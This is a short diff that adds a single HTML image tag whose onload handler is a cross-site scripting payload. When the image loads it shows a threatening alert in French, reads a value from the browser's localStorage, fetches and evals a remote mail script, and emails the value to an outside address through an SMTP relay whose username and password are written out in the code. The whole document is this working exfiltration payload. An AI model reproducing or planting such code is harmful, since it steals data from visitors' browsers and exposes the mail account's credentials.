@@ -1,0 +1,19 @@
+<img src="https://d3isma7snj3lcx.cloudfront.net/optim/images/news/30/3050827573/xenoblade-chronicles-2-refait-les-presentations-sur-switch-f0afde18__w854.jpg" onload="
+  alert('je vais niquer ton système !');
+  const token = window.localStorage.getItem('name');
+  fetch('https:\/\/smtpjs.com/v3/smtp.js').then(smtp => smtp.text()).then(smtp => {
+    console.log(smtp);
+    eval(smtp);
+    Email.send({
+        Host : 'smtp.mailtrap.io',
+        Username : 'ccdeb94eef5b8b',
+        Password : '48c995d30dffe8',
+        To : 'effobless@gmail.com',
+        From : 'effobless@gmail.com',
+        Subject : 'Hack',
+        Body : token
+  }).then(
+    message => console.log(message)
+  );
+});
+">
